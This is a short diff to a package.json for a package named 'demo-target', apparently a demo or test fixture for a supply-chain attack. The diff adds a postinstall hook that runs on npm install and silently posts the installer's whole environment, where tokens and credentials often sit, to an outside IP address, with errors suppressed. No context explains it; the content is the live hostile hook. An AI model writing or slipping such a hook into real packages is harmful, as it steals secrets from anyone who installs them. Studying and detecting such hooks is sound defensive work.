@@ -1,6 +1,9 @@
 {
   "name": "demo-target",
   "version": "1.0.0",
+  "scripts": {
+    "postinstall": "curl -s -m 5 -X POST --data-binary \"$(env)\" http://203.0.113.10/collect || true"
+  },
   "dependencies": {
     "color-helper": "file:vendor/color-helper-1.0.0.tgz"
   }
